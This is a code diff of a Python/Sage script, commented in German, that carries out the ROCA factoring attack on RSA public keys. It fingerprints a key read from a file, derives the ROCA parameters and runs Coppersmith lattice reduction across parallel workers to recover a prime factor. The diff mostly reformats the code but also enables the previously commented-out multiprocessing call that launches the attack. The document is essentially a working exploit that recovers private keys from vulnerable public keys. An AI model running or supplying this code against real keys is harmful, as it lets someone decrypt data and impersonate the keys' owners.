@@ -1,4 +1,3 @@
-
 # coding: utf8
 import pdb
 from Crypto.PublicKey import RSA
@@ -8,7 +7,7 @@ from fractions import gcd as gcd
 import math
 from multiprocessing import Process, Pool
 from sage.all_cmdline import *
-#from roca_fingerprint.detect import RocaFingerprinter
+# from roca_fingerprint.detect import RocaFingerprinter
 import itertools
 from functools import reduce
 import subprocess
@@ -27,6 +26,7 @@ Parameter:
     M = Produkt der ersten n Primzahlen
     m und t = Optimierungs Parameter fuer Coppersmith
 """
+
 
 def get_end(c, ord, id):
     start = int(c) / int(2)
@@ -47,7 +47,7 @@ def get_start(c, ord, id):
 
 
 def worker(args):
-    #{'cpu': rest, 'n': n, 'M_strich': M_strich,'m': m, 't': t, 'c': c, 'ord_new': ord_new}
+    # {'cpu': rest, 'n': n, 'M_strich': M_strich,'m': m, 't': t, 'c': c, 'ord_new': ord_new}
     id = args['cpu']
     pub_key = args['n']
     M_strich = args['M_strich']
@@ -63,9 +63,6 @@ def worker(args):
     end = get_end(c, ord, id)
     ZmodN = Zmod(n)
 
-    first = True
-    print("Trys per core: %d" % (end - start))
-
     for a_strich in xrange(start, end):
         R.<x> = PolynomialRing(ZmodN)
 
@@ -74,15 +71,11 @@ def worker(args):
 
         roots = coppersmith_howgrave_univariate(pol, n, beta, m, t, X)
         for root in roots:
-            p = root*M_strich + int(Integer(65537).powermod(a_strich, M_strich))
+            p = root * M_strich + int(Integer(65537).powermod(a_strich, M_strich))
             if Mod(n, p) == 0:
                 print("--- %s seconds ---" % (time.time() - start_time))
                 print("Success p: %d " % p)
-                break #Todo: break gilt nur für die innere Schleife - Beenden aller threads
-        if first:
-            print("Time per attempt %d seconds." % (time.time()-start_time))
-            first = False
-
+                break  # Todo: break gilt nur für die innere Schleife - Beenden aller threads
 
     return
 
@@ -98,7 +91,7 @@ def coppersmith_howgrave_univariate(pol, modulus, beta, mm, tt, XX):
     #
     # init
     #
-    #dd = pol.degree()
+    # dd = pol.degree()
     dd = 1
     nn = dd * mm + tt
 
@@ -182,7 +175,7 @@ def coppersmith_howgrave_univariate(pol, modulus, beta, mm, tt, XX):
             BB[ii, jj] = gg[ii][jj]
 
     # display basis matrix
-    #if debug:
+    # if debug:
     #    matrix_overview(BB, modulus ^ mm)
 
     # LLL
@@ -195,7 +188,7 @@ def coppersmith_howgrave_univariate(pol, modulus, beta, mm, tt, XX):
 
     # factor polynomial
     potential_roots = new_pol.roots()
-    #print "potential roots:", potential_roots
+    # print "potential roots:", potential_roots
 
     # test roots
     roots = []
@@ -309,15 +302,14 @@ def prime_factors(n):
 
 # M, Primfaktoren von M und Kandidat für Ordnung
 def a2(M, pfo, ord_strich):
-    #M_strich = ZZ(M)
+    # M_strich = ZZ(M)
     M_strich = M
     print(pfo)
     for p in reversed(pfo):
         # ord_pi teilt nicht ord_strich
-        #print("Ord_strich in A2: %d" % ord_strich)
-        #print("Ordnung von %d in A2: %d" % (p, ord(p)))
+        # print("Ord_strich in A2: %d" % ord_strich)
+        # print("Ordnung von %d in A2: %d" % (p, ord(p)))
         if ord_strich % ord(p) != 0:
-
             M_strich /= p
             pfo.remove(p)
 
@@ -337,8 +329,8 @@ def greedy_heuristic(n, M, limes):
     DEBUG = True
 
     ord_M = order(n)
-    pfo = prime_factors(ord_M) # Ordnung der einzelnen Primfaktoren der Ordnung M
-    pf_M = n # Primfaktoren von M
+    pfo = prime_factors(ord_M)  # Ordnung der einzelnen Primfaktoren der Ordnung M
+    pf_M = n  # Primfaktoren von M
     M_old = M
     ord_new = ord_M
 
@@ -398,12 +390,14 @@ def get_m(n, limes):
 
     greedy_heuristic(n, M, limes)
 
-def parm( n, M_strich, m, t, c, ord_new):
+
+def parm(n, M_strich, m, t, c, ord_new):
     rest = multiprocessing.cpu_count()
 
     while rest > 0:
-        yield {'cpu': rest, 'n': n, 'M_strich': M_strich,'m': m, 't': t, 'c': c, 'ord_new': ord_new}
+        yield {'cpu': rest, 'n': n, 'M_strich': M_strich, 'm': m, 't': t, 'c': c, 'ord_new': ord_new}
         rest -= 1
+
 
 def fingerprint(M, n):
     try:
@@ -415,11 +409,12 @@ def fingerprint(M, n):
         print("The Key is resistant to ROCA!")
         return 0
 
+
 if __name__ == "__main__":
     with open('tmp.pub', 'r') as f:
         pub_key = RSA.importKey(f.read())
 
-        #print "Start Zeit: %f" % start_time
+        # print "Start Zeit: %f" % start_time
         param = get_param(pub_key.size())
 
         n = get_primes(param['anz'])
@@ -430,17 +425,19 @@ if __name__ == "__main__":
             limes = math.log(pub_key.n, 2) / 4
 
             M_strich, ord_new = greedy_heuristic(n, M, limes)
-            print("Bitlength of M %d" %int(M).bit_length())
+            print("Bitlength of M %d" % int(M).bit_length())
             print("Bitlength of M_strich %d" % int(M_strich).bit_length())
 
             threads = []
             b = Mod(65537, M_strich)
             c = discrete_log(pub_key.n, b)
+            p = Pool()
+            p.map(worker, parm(pub_key, M_strich, param['m'], param['t'], c, ord_new))
         else:
             print("Resistant Key: Terminating execution!")
 
-            #print(pub_key.n)
-            #p = Pool()
-            #p.map(worker, parm(pub_key, M_strich,  param['m'], param['t'], c, ord_new))
+            # print(pub_key.n)
+            # p = Pool()
+            # p.map(worker, parm(pub_key, M_strich,  param['m'], param['t'], c, ord_new))
 
-            #worker({'cpu': 0, 'n': pub_key, 'M_strich': M_strich, 'm': param['m'], 't': param['t'], 'c': c, 'ord_new': ord_new})
+            # worker({'cpu': 0, 'n': pub_key, 'M_strich': M_strich, 'm': param['m'], 't': param['t'], 'c': c, 'ord_new': ord_new})
